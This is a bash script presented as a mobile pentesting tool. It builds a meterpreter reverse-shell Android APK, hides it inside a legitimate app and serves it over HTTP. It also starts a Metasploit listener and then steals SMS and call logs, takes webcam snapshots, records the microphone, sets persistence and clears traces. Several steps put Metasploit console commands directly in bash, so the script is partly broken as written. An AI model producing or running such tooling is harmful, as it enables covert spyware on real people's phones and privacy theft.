#!/bin/bash

# Mobile Penetration Testing Automation Script
# Author: Muhammad Sudais Usmani
# Description: This script automates various tasks related to mobile pentesting.

# Define Variables
TARGET_IP="192.168.170.101"
TARGET_PORT="5555"
LHOST="192.168.130.129"
LPORT="443"
PAYLOAD="android/meterpreter/reverse_tcp"
OUTPUT_APK="backdoor.apk"
INFECTED_APK="infected_app.apk"

# Check ADB Connection
check_adb() {
    echo "[+] Checking ADB connection..."
    adb devices
    adb connect $TARGET_IP:$TARGET_PORT
}

# Gain Shell Access via ADB
adb_shell_access() {
    echo "[+] Gaining shell access..."
    adb shell
}

# Generate Malicious APK
generate_payload() {
    echo "[+] Generating malicious APK..."
    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_APK
}

# Inject Payload into Existing APK
disguise_apk() {
    echo "[+] Injecting payload into a legitimate APK..."
    read -p "Enter path to original APK: " ORIGINAL_APK
    msfvenom -x $ORIGINAL_APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $INFECTED_APK
}

# Start a Python HTTP Server for APK Deployment
start_http_server() {
    echo "[+] Starting Python HTTP server on port 8080..."
    python3 -m http.server 8080 &
}

# Start Metasploit Listener
start_msf_listener() {
    echo "[+] Starting Metasploit listener..."
    msfconsole -q -x "use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; exploit"
}

# Gain Control Over the Target
control_device() {
    echo "[+] Listing active sessions..."
    sessions
    read -p "Enter session ID to interact with: " SESSION_ID
    sessions -i $SESSION_ID
}

# Extract Information
extract_data() {
    echo "[+] Extracting data from the target device..."
    echo "Dumping call logs..."
    dump_calllog
    echo "Dumping SMS messages..."
    dump_sms
    echo "Capturing webcam snapshot..."
    webcam_snap
    echo "Recording microphone for 10 seconds..."
    record_mic 10
}

# Maintain Access
maintain_access() {
    echo "[+] Enabling persistence..."
    run persistence -A
}

# Clear Traces
clear_traces() {
    echo "[+] Removing malicious APK..."
    adb shell rm /sdcard/$OUTPUT_APK
}

# Menu
while true; do
    echo "\n[ Mobile Pentesting Automation Script ]"
    echo "1) Check ADB Connection"
    echo "2) Gain ADB Shell Access"
    echo "3) Generate Malicious APK"
    echo "4) Inject Payload into APK"
    echo "5) Start HTTP Server for Deployment"
    echo "6) Start Metasploit Listener"
    echo "7) Control Compromised Device"
    echo "8) Extract Data from Target"
    echo "9) Maintain Access"
    echo "10) Clear Traces"
    echo "11) Exit"
    read -p "Choose an option: " OPTION
    
    case $OPTION in
        1) check_adb ;;
        2) adb_shell_access ;;
        3) generate_payload ;;
        4) disguise_apk ;;
        5) start_http_server ;;
        6) start_msf_listener ;;
        7) control_device ;;
        8) extract_data ;;
        9) maintain_access ;;
        10) clear_traces ;;
        11) exit 0 ;;
        *) echo "Invalid option, please try again." ;;
    esac
done
